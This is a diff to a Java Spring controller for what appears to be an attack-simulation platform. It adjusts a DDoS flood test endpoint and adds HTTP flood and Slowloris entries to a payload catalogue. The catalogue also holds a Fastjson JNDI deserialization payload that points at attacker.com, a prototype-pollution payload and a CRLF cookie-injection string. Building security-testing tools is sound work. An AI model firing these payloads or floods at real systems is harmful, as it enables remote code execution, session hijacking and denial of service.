@@ -58,12 +58,13 @@ public class SimulationController {
 
     @PostMapping("/flood")
     public ResponseEntity<AttackSimulationService.FloodSimulationResult> testFlood(
-            @RequestBody FloodTestRequest request,
+            @RequestBody(required = false) FloodTestRequest request,
             Authentication authentication) {
 
         String username = authentication != null ? authentication.getName() : "krishna";
-        String domain = request.targetDomain() != null ? request.targetDomain() : "usertesting.singamsettikrishna.in";
-        int count = request.requestCount() > 0 ? request.requestCount() : 50;
+        String domain = (request != null && request.targetDomain() != null && !request.targetDomain().isBlank())
+            ? request.targetDomain() : "usertesting.singamsettikrishna.in";
+        int count = (request != null && request.requestCount() > 0) ? request.requestCount() : 60;
 
         AttackSimulationService.FloodSimulationResult result = simulationService.runDdosFloodTest(
             username,
@@ -117,6 +118,10 @@ public class SimulationController {
             // Deserialization & Prototype Pollution
             Map.of("category", "DESERIALIZATION_ATTACK", "title", "Fastjson @type Remote JNDI Deserialization", "payload", "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com:1389/Exploit\",\"autoCommit\":true}", "description", "Exploits polymorphic deserialization to trigger JNDI connection"),
             Map.of("category", "PROTOTYPE_POLLUTION", "title", "JavaScript __proto__ Object Pollution", "payload", "{\"__proto__\": {\"isAdmin\": true, \"role\": \"ROLE_SUPER_ADMIN\"}}", "description", "Pollutes global JavaScript prototype to escalate privileges"),
+
+            // DoS / DDoS HTTP Flood & Slowloris
+            Map.of("category", "DOS_HTTP_FLOOD", "title", "Volumetric Layer-7 HTTP GET Flood", "payload", "GET /api/v1/search?query=flood_probe HTTP/1.1 (Burst: 100 concurrent requests/sec)", "description", "Simulates high-velocity L7 HTTP flood to saturate server bandwidth and trigger token bucket rate limiting"),
+            Map.of("category", "DOS_HTTP_FLOOD", "title", "Slowloris Connection Starvation & Header Flood", "payload", "X-a: b\\r\\nX-c: d (Incomplete continuous HTTP header stream keeping worker threads saturated)", "description", "Simulates low-and-slow application exhaustion attack to starve thread pools"),
 
             // CRLF & Path Traversal
             Map.of("category", "CRLF_INJECTION", "title", "HTTP Response Splitting & Set-Cookie Injection", "payload", "%0d%0aSet-Cookie:%20session_admin=hijacked_token_123;%20Domain=.singamsettikrishna.in", "description", "Injects CRLF newline bytes to split HTTP response headers"),
